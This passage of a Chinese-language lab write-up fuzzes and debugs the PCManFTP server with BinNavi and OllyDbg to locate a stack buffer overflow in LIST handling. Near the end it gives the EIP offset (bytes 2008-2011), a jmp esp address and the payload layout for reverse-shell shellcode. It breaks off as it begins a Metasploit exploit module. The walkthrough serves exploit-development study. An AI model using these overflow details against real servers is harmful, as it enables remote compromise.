2&amp;gt;设置user为annoymous,pass为test
3&amp;gt;只取list命令作为fuzz的对象
4&amp;gt;只选择A作为fuzz的数据
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/fuzzftp.png&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;x03-binnavi&quot;&gt;0x03 binnavi使用方法&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0&amp;gt;binnavi安装在win2003上,ip:192.168.3.176
1&amp;gt;新建一个project
2&amp;gt;导入一个模块(ida生成的idb文件)
    出现错误及安装binnavi解决方法可参考https://github.com/google/binnavi/issues/94
3&amp;gt;新建一个debugger:192.168.3.177:2222
    192.168.3.77为安装ftpfuzz工具的一台win7机器,用于fuzz目标192.168.3.177上的pcmanftp
    192.168.3.176为安装binnavi的机器,用于远程调试192.168.3.177上的ftp进程,并追踪ftp进程上的相关指令
    192.168.3.177为目标ftp运行的机器,通过在192.168.3.177上安装idapro(6.8)加载该ftp进程后产生idb文件,将该idb文件复制到192.168.3.176(win2003)上用binnavi加载
    为了实现在192.168.3.176上远程调试192.168.3.177的ftp,需要在192.168.3.177上运行:
        https://github.com/google/binnavi/releases/download/v6.1.0/debugclient.exe
        或
        http://pan.baidu.com/s/1hsK0jwK中的debugclient.exe
    在win7上不要用管理员权限运行,否则debugclient.exe会报断点错误,运行方法:
        win+r
        cmd
        debugclient.exe pid
4&amp;gt;初始化模块
    双击图中的modules下面的pcmanftpd2.exe,或右键选择laod+initial,使得产生图中有Native Callgraph的面板,此时如果双击图中箭头指向的Native Callgraph可产生graph视图,并可从graph视图(图6)的菜单中选择windows下的debug perspective子项进行进程调试和指令追踪,此处不用这种方法,选择下面更好一点的方法
5&amp;gt;产生grahp视图
    双击NewProject,左键按住modules下的pcmanftpd2.exe并拖到NewProject下的Default address space上面,这样将会把导入的idb模块&quot;对应放到&quot;default address space中,然后可以右键单击defalut address space,选择create combined callgraph,此时将产生上面说的graph视图(图6),如果不用这种方法而用上面的方法则不能在defalut address space上右键选择create combined callgraph,binnavi会报错
6&amp;gt;上面的graph视图窗口对应下面的图6
7&amp;gt;动态调试192.168.3.177上的ftp进程并追踪指令
    在正常binnavi窗口中(非graph窗口):
        在NewProject面板中选择并保存上面设置的debugger,如下图7
        在Default address place面板中选择并保存上面设置的debugger,如下图7-2
    在graph窗口中:
        单击菜单中的windows,并选择debug perspective,将打开调试窗口,如下图7-3
        单击下图7-4中的start debug开始进程调试
        单击下图7-4中的start trace mode开始指令追踪
        实验中binnavi版本为最新的6.1+ida pro6.8,安装在win2003系统上,此安装的binnavi有以下问题:
            1.stop trace mode按钮只是前几次有效(eg.10次内的trace列表)
            2.在1下先按stop trace mode再按start trace mode按钮可以实时刷新地跟踪指令
            3.按下超过一定次数的start trace mode(一定trace列表数)2中情况不再有效,需要重新start debugger,这也意味着要重新在192.168.3.177中重新运行pcmanftp,并运行:
                win+r
                cmd
                debugclient.exe pid
            4.binnavi中使用指令追踪功能时除了上面2中的方法也可以通过删除trace列表里面的已存在的trace,然后重新按start trace mode,这样可以不用按像2中(stop trace mode再按start trace mode)而达到指令追踪的目的,192.168.3.177的win7上运行debugclient.exe pid时不用管理员身份运行虽然会报断点错误,但是好像实际实验中追踪效果更好,此点尚疑.一般情况下,每个应用都用管理员身份运行不易出错(debugclient.exe,pcmanftp,binnavi)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;图1
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/binnavi-1.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;图2
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/binnavi-2.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;图3
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/binnavi-3.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;图4
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/binnavi-4.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;图5
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/binnavi-5.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;图6
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/binnavi-6.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;图7
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/binnavi-7.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;图7-2
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/binnavi-7-2.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;图7-3
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/binnavi-7-3.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;图7-4
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/binnavi-7-4.png&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;x03-&quot;&gt;0x03 实战&lt;/h3&gt;

&lt;h4 id=&quot;dep-off&quot;&gt;1&amp;gt;dep off&lt;/h4&gt;

&lt;p&gt;实验中win7系统中默认dep关闭如下&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/dep_close_on_win7.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;追踪192.168.3.177中的pcmanftp进程的溢出指令&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.运行192.168.3.177上的pcmanftp后用管理员权限运行clientdebug.exe pid,然后单击192.168.3.176上的graph视图窗口下的debug perspective下的start debug,开始远程调试pcmanftp
2.单击start trace mode,binnavi下完断点后再单击start trace mode,此时binnavi中的trace列表如下图a,然后在192.168.3.77(另外一台win7,安装有ftpfuzz工具,用来fuzz目标192.168.3.177里的pcmanftp),事先设置fuzz数据为发送30,70...到9000个A,后来发现发送9000个A会使pcmanftp出错,于是最后设置fuzz数据为只发送9000个A,便于追踪出错的详细汇编语句,如下图b:
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;图a
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/a.png&quot; /&gt;
图b
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/fuzz-2.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;3.完成2中的设置后在192.168.3.77中单击上图中的start按钮,用ftpfuzz发送9000个A,只选择LIST命令进行fuzz,fuzz结束后binnavi中对应trace列表如下图trace1,说明ftpfuzz与binnavi的数据交互中共产生了72个event,也即从发送anonymous登录到发送完LIST 9000xA命令后的event,但是这样不能精确追踪到关键溢出(发送9000个A)时的代码,不会将登录ftp的过程记录到event中,使得event有72个,较大,为了精确追踪到pcmanftp对9000个A的数据处理过程,需要过滤掉fuzzftp登录pcmanftp的过程,于是进行如下操作:
    on 192.168.3.177:
        关闭pcmanftp
        打开pcmanftp    #如果不重新打开pcmanftp,客户端用anonymous登录时会报&quot;too many users&quot;错误
        debugclient.exe pid
    on kali:(192.168.3.106)
        ftp
        open 192.168.3.177
        user:anonymous
        pass:test
    on binnavi(192.168.3.176)
        start trace mode    
            #因为上面重新打开了pcmanftp,此处不用先stop trace mode,binnavi自动关闭了
        start trace mode    
            #这条命令执行后trace列表如下图trace2
    on kali:
        LIST AAA...A(9000个)    
            #结果显示&quot;Invalid command&quot;,再看binnavi中trace列表,发现没有新增,结果依然为下图strace2,认为是terminal终端下登录ftp和ftpfuzz工具有点不同,终端下登录可能被本地ftp客户端的程序发现命令不对先给截断了
    
    on 192.168.3.177:
        重新打开pcmanftp并debug     #重新追踪
    on binnavi:
        重新start debug,start trace mode,start trace mode
    on kali:
        ftp
        open 192.168.3.177
        user:anonymous
        pass:test
    on binnavi:
        start trace mode
            #上面annoymous登录后,运行这条命令前binnavi已记录kali中anonymous登录过程中的指令,在binnavi上运行这条命令后,再从kali中传输list Ax9000的命令则将会记录下list Ax9000这个过程中的指令
    on kali:
        ls AA..A(9000个)
            #后来发现terminal下虽然list命令不可以成功,但可以ls 9000个A发送过去
    on binnavi:
        此时产生list 9000xA命令的trace指令列表,如下图trace3,说明list Ax9000这个命令运行后在pcmanftp上有7个event与之对应,此时eip已经被覆盖成41414141,说明大概到图trace3的sub_427350处已经覆盖了eip为41414141了,后来od跟踪发现确实如此
        也即追踪到的关键event(指令)为:
            sub_402B60
            _atoi
            _atoi
            sub_405410
            sub_427350
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;图trace1
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/trace1.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;图trace2
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/trace2.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;图trace3
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/trace3.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    追踪到相关指令后此时binavi暂时退出,用od调试pcmanftp

    on 192.168.3.177:
        重新打开pcmanftp,od附加
        f9      #此时单击屏幕底部的状态栏发现不能看到pcmanftp的主界面
        ctrl+g:402b60---&amp;gt;f2
        ctrl+g:405410---&amp;gt;f2     
            #405410处像是异常处理程序相关,下面是od中的数据,后来相通了,这显然是在构造se异常处理,将一个异常处理方法放入栈中,线程初始化时,会自动向栈中安装一个seh,用作线程的默认异常处理
        -----------content of 405410------------
        00405410  /$  6A FF         push -0x1
        00405412  |.  68 292D4300   push PCManFTP.00432D29                   ;  SE 处理程序安装
        00405417  |.  64:A1 0000000&amp;gt;mov eax,dword ptr fs:[0]
        0040541D  |.  50            push eax
        0040541E  |.  64:8925 00000&amp;gt;mov dword ptr fs:[0],esp
        00405425  |.  51            push ecx
        00405426  |.  53            push ebx
        00405427  |.  56            push esi                                 ;  PCManFTP.00441250
        00405428  |.  8BF1          mov esi,ecx
        0040542A  |.  897424 08     mov dword ptr ss:[esp+0x8],esi           ;  PCManFTP.00441250
        0040542E  |.  E8 BD120000   call PCManFTP.004066F0
        ---------------end----------------------
        ctrl+g:427350---&amp;gt;f2
    on kali:
        ftp
        open 192.168.3.177  #发现此时不能显示ftp会话消息,像是pcmanftp&quot;卡住了&quot;
    on 192.168.3.177&#39;s od:
        alt+v
        t
        右键resume all threads  
            #此时可以单击状态栏中的pcmanftp可以显示pcmanftp主界面,且kali中也可以显示ftp会话信息,关于&quot;卡住&quot;以后为什么可以通过resume all threads来调试而&quot;不影响&quot;调试目的有以下猜想:
            windows程序有消息响应机制,windows程序中的主线程一直在等待各个子线程的消息,如果某个子线程中断或者出故障了,可能会被主线程知道,然后主线程调用相应方法去处理这个出问题的子线程,这样就可以解释在下完402b60,405410,427350的断点后,发送ls Ax9000到pcmanftp,在od中一直按f9,却没有在某时刻可以看到eip=41414141,而最后由于的确存在某时刻eip=41414141,导致异常,最后弹出如下图error显示的错误对话框,对话框中显示出错原因为eip被41414141覆盖,这样大概是因为当eip在某时刻被41414141覆盖的时候,于是这个子线程出故障了,程序的主线程知道了这个消息,然后调用seh链中的异常处理程序,处理的结果就是弹出这样一个错误详细信息对话框
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;图error
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/error.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;on kali:
    user:anonymous
    pass:test
    ls AAA..A(9000个)
on 192.168.3.177&#39;od:
    此时中断在402b60处
    在堆栈窗口中:ctrl+b查找AAAA
        #提示没有找到
    f9
    此时中断在405410处
    在堆栈窗口中:ctrl+b查找AAAA
        #提示没有找到
    f9
    此时中断在427350处
    在堆栈窗口中:ctrl+b查找AAAA
        #提示找到,说明通过binnavi找到的这些event中,关键的覆盖eip的指令在405410到427350这两个断点之间
    载pcmanftp,并重点关注405410到427350这两个断点之间会经过的指令
    
on 192.168.3.177&#39;s od:(重复以上加载并resume all threads过程直到中断到405410处)
    ...
    ...
    ...
    --------查找关键汇编指令方法---------
    结过漫长的ctrl+f9,f8,时刻关注堆栈,寄存器,反汇编窗口指令等,在可疑函数f8单步步过后在堆栈窗口中ctrl+b查找AAAA
    --------------end--------------------

现从405410到427350两个断点之间的指令,如果通过f8,f7,ctrl+f9等的一步一步调试无法到达覆盖eip的关键指令处,而通过在405410断点处直接f9到427350处会经过覆盖eip的关键指令处,然而确无法单步调试到关键指令处.

单步调试时指令经过流程为:
    405410到427350,再由427350到427350
    其中405410到427350流程中无法捕捉到覆盖eip的关键指令,于是指令开始在427350到427350之间一直循环,像是一个进程阻塞当中(eg.listen,accept),427350到427350也无法捕捉到覆盖eip的关键指令,在427350处f9到427350时,情况和下面的405410处f9到427350的情况一样

但是,两个断点之间f9运行调试时:
    在405410处f9到427350时,在堆栈窗口中ctrl+b:41414141却能找到41414141,说明f9运行时,的确经过了覆盖eip的关键指令

出现以上这种现象暂时不能理解,猜测有可能是427350是一个循环等待的函数,并且与有时间相关,如果每次时间超过一定时间(单步调试程序某个线程等待造成时间较长),这个427350处的循环等待判断为无效,即只在一定时间内判定为有效循环等待(这样在427350处f9运行调试到427350处时可以在堆栈窗口捕获到AAAA就可以理解了)

于是尝试在405410和427350下断点后(到此处不用在402b60处下断点了),f9运行pcmanftp,然后在kali中的terminal中ftp open 192.168.3.177登录,之后输入ls 9000xA命令,待od中中断到405410时,在od的汇编代码区右键查看所有模块间调用,并在所有模块间调用处下断点,然后一直f9运行调试pcmanftp,这样有可能会在堆栈区捕获到AAAA,具体步骤如下:

on 192.168.3.177&#39;s od:
    alt+f2      #关闭调试程序
    重新运行pcmanftp并附加到od
    ctrl+g:405410---&amp;gt;f2
    ctrl+g:427350---&amp;gt;f2
    f9
on kali:
    ftp
    open 192.168.3.177
on 192.168.3.177&#39;s od:
    f9      #不是必须
    alt+v
    t
    右键resume all threads
on kali:
    user:anonymous
    pass:test
    ls AAA..A(9000个)
on 192.168.3.177&#39;s od:
    自动中断在405410处
    右键查找所有模块间调用
    在每个命令上设置断点
    alt+c
    f9
    ...
    (alt+c后共输入123个f9)
    此时观察到堆栈区第一次出现大长串AAAAAAAAAA,断点处在416685,也即在416685处的模块间调用开始出现AAAAAAA,如下图od1
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;图od1
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/od1.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;于是重新在405410,416685,427350处下断点,重点关注405410到416685后,在416685开始的指令流程,具体如下:

on 192.168.3.177&#39;od:
    ctrl+g:405410---&amp;gt;f2
    ctrl+g:427350---&amp;gt;f2
    f9
on kali:
    ftp
    open 192.168.3.177
on 192.168.3.177&#39;od:
    alt+v
    t
    resume all threads
on kali:
    user:anonymous
    pass:test
    ls AA..A(9000个)
on 192.168.3.177&#39;s od:
    ctrl+g:416685---&amp;gt;f2
    alt+c
    此时自动中断在405410处

    ------------output:-----------
    00405410  /$  6A FF         push -0x1
    00405412  |.  68 292D4300   push PCManFTP.00432D29                   ;  SE 处理程序安装
    00405417  |.  64:A1 0000000&amp;gt;mov eax,dword ptr fs:[0]
    0040541D  |.  50            push eax
    --------------end-------------

    f9
    此时自动中断在416685处

    -----------output:-----------
    00416685  |.  FF15 58524300 call dword ptr ds:[&amp;lt;&amp;amp;KERNEL32.GetLastErr&amp;gt;; [GetLastError
    0041668B  |.  FF35 B0284400 push dword ptr ds:[0x4428B0]             ; /TlsIndex = 1A
    00416691  |.  8BF8          mov edi,eax                              ; |
    00416693  |.  FF15 98514300 call dword ptr ds:[&amp;lt;&amp;amp;KERNEL32.TlsGetValu&amp;gt;; \TlsGetValue
    ------------end---------------

    f9
    此时又中断到416685处(不过堆栈窗口出现了AAAAAAA)

    ------------output:-----------
    00416685  |.  FF15 58524300 call dword ptr ds:[&amp;lt;&amp;amp;KERNEL32.GetLastErr&amp;gt;; [GetLastError
    0041668B  |.  FF35 B0284400 push dword ptr ds:[0x4428B0]             ; /TlsIndex = 1A
    00416691  |.  8BF8          mov edi,eax                              ; |
    00416693  |.  FF15 98514300 call dword ptr ds:[&amp;lt;&amp;amp;KERNEL32.TlsGetValu&amp;gt;; \TlsGetValue
    --------------end--------------
    
    此时对应的od中截图如下图od2:
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;图od2
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/od2.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;esp下面的第一个返回到的地址为当前栈帧的返回地址,也即汇编窗口中004166e9处的retn要返回到的地址
esp下面的第二个返回到的地址4029db为当前函数栈帧的上一函数栈帧中的retn要返回的地址
esp下面的第三个返回到的地址4029ff为当前函数栈帧的上一函数的上一函数的栈帧中的retn要返回的地址

此时堆栈窗口数据如下:
    ----------------stack------------------
    0018ED28   00000402
    0018ED2C   004411DC  ASCII &quot;
    &quot;
    0018ED30   00412967  返回到 PCManFTP.00412967 来自 PCManFTP.00416683
    0018ED34   00000402
    0018ED38   00000000
    0018ED3C   00000000
    0018ED40   0018ED68
    0018ED44   0018ED64
    0018ED48   00000000
    0018ED4C   00000000
    0018ED50   00001000
    0018ED54   0018ED78  ASCII &quot;LIST AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;...
    0018ED58   01D817A0
    0018ED5C   004029DB  返回到 PCManFTP.004029DB 来自 wsock32.recv
    0018ED60   01D817A0
    0018ED64   004029EF  返回到 PCManFTP.004029EF 来自 PCManFTP.00412956
    0018ED68   0018ED78  ASCII &quot;LIST AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;...
    0018ED6C   004411DC  ASCII &quot;
    &quot;
    0018ED70   00000000
    0018ED74   00000001
    0018ED78   5453494C
    0018ED7C   41414120
    0018ED80   41414141
    0018ED84   41414141
    0018ED88   41414141
    0018ED8C   41414141
    -----------------end-------------------

参照上一篇文章:
http://3xp10it.github.io/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/06/04/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%85%A5%E9%97%A8-%E5%8A%A8%E6%80%81%E8%B7%9F%E8%B8%AA%E6%BA%90%E4%BB%A3%E7%A0%81%E5%92%8C%E5%8F%8D%E6%B1%87%E7%BC%96%E4%BB%A3%E7%A0%81/中的图stack0易知:
    
    其中栈中0018ed8c以后很长一段数据都是41414141,由于此时中断到416685而堆栈窗口中首次出现AAAAAA数据,而堆栈窗口中最近的三个返回地址中00412976对应的是本函数栈帧(对应图od2)中的004166e9处的retn,这样的话,很有可能是本函数栈帧的上一帧函数(该函数内的retn对应返回到4029db)或者是上上一帧函数(该函数内的retn对应返回到4029ef)的返回地址被此时栈中的大长串A覆盖成41414141
    当前eip对应的函数帧是00416683函数,当前函数帧的上一帧函数是wsock32.recv,wsock32.recv函数帧的上一函数帧的00412956函数,形如下面表示:
    -----------------------------format:--------------------------------
    00412956:(412956函数帧)
            00412954:push ebp
            xxxxxxxx:mov ebp,esp
            xxxxxxxx:...
            xxxxxxxx:...
            xxxxxxxx:call wsock32.recv(这条汇编语句的下一条语句的地址为004029db)
                       (wsock32.recv函数帧)
                       recv&#39;s addr:push ebp
                       xxxxxxxx:mov ebp,esp
                       xxxxxxxx:...
                       xxxxxxxx:...
                       xxxxxxxx:call 00416683(这条汇编语句的下一条语句的地址为00412967)
                                  (00416683函数帧,对应图od2中语句)
                                  00416683:push ebp
                                  xxxxxxxx:mov ebp,esp
                                  xxxxxxxx:...
                                  xxxxxxxx:...
                                  00416685:call getlasterror
                                  0041668b:push ds:[0x4428b0]
                                  xxxxxxxx:...
                                  xxxxxxxx:...
                                  004166e9:retn(将返回到00412967)
                                  ...
                                  ...
                       00412967:...(此处00412967对应为上面call 00416683语句中00416683函数的返回地址)
                       ...
                       ...
                       xxxxxxxx:retn(将返回到004029db)
                       ...
                       ...
            004029db:...(此处004029db对应为上面call wsock32.recv语句中wsock32.recv函数的返回地址)
            ...
            ...
            xxxxxxxx:retn(将返回到004029ef)
            ...
            ...
    004029ef:xxx(此处004029ef对应00412956函数桢中的retn语句要返回的地址)
    -------------------------------end----------------------------------
        
    所以有可能当前函数帧(对应图od2)中的汇编语句(执行到4166e9处的retn之前的语句)会导致栈中的两个返回地址(0018ed5c处的004029db和0018ed64处的004029ef)被覆盖,也有可能在wsock32.recv函数帧中某语句覆盖0018ed64处的004029ef,也有可能是本函数帧(00416683,正常情况下esp下面最近一个返回地址在od中显示来自于什么函数则当前eip在该函数帧中)的下一函数帧(也即还没执行到的函数,当前函数帧为最新函数帧)中的汇编语句覆盖两个返回地址或这两个返回地址下面比较远的返回地址等

    于是重点关注堆栈窗口中的0018ed5c处的004029db和0018ed64处的004029ef是否可能会在当前函数帧中执行到004166e9之前或下一个将到达的函数帧中被改写成41414141

    在od中f8单步调试时,遇到可疑指令如call xxx等,在堆栈窗口中ctrl+g(堆栈中跟随):0018ed5c或0018ed64,然后f8单步调试,具体如下操作:

    ------------从图od2中情况下开始的操作-------------
    f8
    f8
    ..
    f8
    执行到图od2中的004166e9处的retn时,0018ed5c和0018ed64处的返回地址都不变,继续f8跳到412967处,此时在wsock32.recv函数帧中,继续f8
    f8
    ..
    f8
    执行到412997处时,在到达这个函数帧中的rent语句前,所有的指令都在wsock32.recv函数帧中,0018ed5c中的返回地址由004029db被改成000000,也即wsock32.recv函数帧中的retn指令被执行时将返回到由004029db变成的00000000,此时栈帧已经被破坏,执行完wsock32.recv函数帧中的retn指令后,将跳到00000000执行,也即在当前帧(wsock32.recv函数帧)中执行到retn语句时,将发生错误,对应汇编指令为:

        00412976    5F              pop edi
        00412977    8A16            mov dl,byte ptr ds:[esi]
        00412979    B3 01           mov bl,0x1
        0041297B    0FB6CA          movzx ecx,dl

    对应堆栈窗口中0018ed5c和0018ed64处的内容为:

        0018ED58   00000000
        0018ED5C   00000000
        0018ED60   01D817A0
        0018ED64   004029EF  返回到 PCManFTP.004029EF 来自 PCManFTP.00412956
        0018ED68   0018ED78  ASCII &quot;LIST AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;...
        0018ED6C   01D80F80

    而当前函数帧中的retn语句在如下位置004129f9处:

        004129F1    F7D8            neg eax
        004129F3    1BC0            sbb eax,eax
        004129F5    23C3            and eax,ebx
        004129F7    5B              pop ebx
        004129F8    C9              leave
        004129F9    C3              retn

    所以如果是要将堆栈窗口中0018ed5c处的004029db或0018ed64处的004029ef这两个返回地址覆盖成41414141有极大的可能是在当前函数帧的004129f9处的retn语句前完成,而0018ed64处被覆盖成41414141的可能性更大,因为0018ed5c处已经被覆盖成00000000了

    f8
    f8
    ..
    f8
    在eip=004129f9前,单步执行到004129c1处
    f8
    f8
    ..
    f8执行到004129df,以jmp 到004129c1,也即004129c1到004129df相当于一个for循环,004129c1处开始到retn语句前的汇编指令如下:

        004129C1    8A02            mov al,byte ptr ds:[edx]
        004129C3    84C0            test al,al
        004129C5    74 1E           je short PCManFTP.004129E5
        004129C7    0FB6F0          movzx esi,al
        004129CA    8BCE            mov ecx,esi
        004129CC    6A 01           push 0x1
        004129CE    23CF            and ecx,edi                              ; PCManFTP.00439C18
        004129D0    58              pop eax                                  ; PCManFTP.00439C18
        004129D1    D3E0            shl eax,cl
        004129D3    C1EE 03         shr esi,0x3
        004129D6    8A4C35 E0       mov cl,byte ptr ss:[ebp+esi-0x20]
        004129DA    84C1            test cl,al
        004129DC    75 03           jnz short PCManFTP.004129E1
        004129DE    42              inc edx                                  ; ntdll_1a.7770B831
        004129DF  ^ EB E0           jmp short PCManFTP.004129C1
        004129E1    8022 00         and byte ptr ds:[edx],0x0
        004129E4    42              inc edx                                  ; ntdll_1a.7770B831
        004129E5    8B45 0C         mov eax,dword ptr ss:[ebp+0xC]
        004129E8    5F              pop edi                                  ; PCManFTP.00439C18
        004129E9    5E              pop esi                                  ; PCManFTP.00439C18
        004129EA    8950 18         mov dword ptr ds:[eax+0x18],edx          ; ntdll_1a.7770B831
        004129ED    8BC3            mov eax,ebx
        004129EF    2BC2            sub eax,edx                              ; ntdll_1a.7770B831
        004129F1    F7D8            neg eax
        004129F3    1BC0            sbb eax,eax
        004129F5    23C3            and eax,ebx
        004129F7    5B              pop ebx                                  ; PCManFTP.00439C18
        004129F8    C9              leave
        004129F9    C3              retn
    -----------------end------------------------

    直接在004129df的下一条语句004129e1上f4,发现f4以后eip直接跳到了00416685处的call getlasterror语句上,而不是f4执行到004129e1上,且f4以后0018ed5c处的004029db和0018ed64处的004029ef都被覆盖改写成41414141

    说明004129c1到004129df为关键的复制过程,这个过程覆盖了0018ed5c处的004029db和0018ed64处的004029ef

    然而在当前wsock32.recv函数帧中,如果覆盖返回地址,一般是只能覆盖到当前函数帧的上一函数帧的返回地址,即覆盖0018ed64处的004029ef,不明白为何连当前函数帧的返回地址也被覆盖成41414141了,这一点不解

    猜测是由于windows的消息机制,程序的主线程监视到有函数的返回地址被覆盖成不可执行的地址41414141时,进入异常处理链开始执行(由于主线程优先级高,于是出问题后不去41414141处执行,也不去原来wsock32.recv函数帧当中按f4处的004129e1执行),发现没有专门对应的exception handler,最后调用unhandled exceptionfilter(后来f8单步发现是有call unhandled exceptionfilter)处理这个异常,最后弹出图error的对话框,认为有某一刻eip=41414141,但是这一刻没有在单步调试中出现,认为由004129e1处突然跳到了call getlasterror的过程中,实际上是先到eip=41414141处,然后再跳到到call getlasterror处,或许是由于这个过程太快或比较特殊而没有被od捕捉到因而没有遇到eip=41414141的时刻

    但是现在不能确定是0018ed5c处被覆盖成的41414141还是0018ed64处被覆盖的41414141是真正的那一刻eip=41414141的时刻而引起的主线程优先进入异常处理

    理论上是在004129e1处f4的时候,由于还在wsock32.recv函数帧当中,返回的先后顺序是先返回到0018ed5c处被覆盖的41414141再返回到0018ed64处被覆盖的41414141,然而0018ed5c原来被覆盖成00000000时是可以理解的,被覆盖成41414141是不可理解的,于是这两种可能性都不能确定

    在内存中覆盖时AAAA的数据由0018e58e开始到0018ed64共2006个字节,由0018e58e开始到0018ed5c共1998个字节,重新发送1998xA+BBBB+CCCC+DDDD到pcmanftp,不用od加载,看看最后的error对话框中的异常位移是多少

    向pcmanftp发送Ax1998+Bx4+Cx4+Dx4发现不能使pcmanftp停止工作,于是发送Ax1998+Bx4+Cx4+Dx4+Ex6990(共9000个字节),成功使之停止工作,但是弹出对应error图中对话框中的异常偏移为45444444,也即对应EDDD,这样应该是说明是0018ed64处的41414141被覆盖,但是又相差一个字节,不知是那里算错了,暂且不纠结于此
    
    发送Ax1998+Bx4+Cx4+Dx4+F+Ex6989(共9000个字节),成功使之停止工作,且异常偏移显示为46444444,说明发送的9000个字节中,第2008到2011个字节处为覆盖eip处,构造exploit,发现与https://www.exploit-db.com/exploits/39662/链接中的偏移情况相同,都是在第2008-2011个字节处为覆盖返回地址的eip处,在这里填入jmp esp的地址后,再在后面填入用于反弹的shellcode即可,不同的是exploit-db中的是winxpsp3 eng环境,而此处环境为win7x64的中文系统环境
    
    在192.168.3.177中运行pcmanftp后od附加,alt+e选择一个系统dll(实验中选择的是c:\windows\system32\ntdll.dll),在od中ctrl+f:jmp esp找到一个地址为77506aeb,构造的exploit如下:

    -------------------------exploit.rb---------------------------------
    ##
    # This module requires Metasploit: http://metasploit.com/download
    # Current source: https://github.com/rapid7/metasploit-framework
    ##
    
    require &#39;msf/core&#39;
    
    class Metasploit3 &amp;lt; Msf::Exploit::Remote
      Rank = NormalRanking
    
      include Msf::Exploit::Remote::Ftp
    
      def initialize(info = {})
        super(update_info(info,
          &#39;Name&#39;           =&amp;gt; &#39;PCMAN FTP Server Buffer Overflow - PUT Command&#39;,
          &#39;Description&#39;    =&amp;gt; %q{
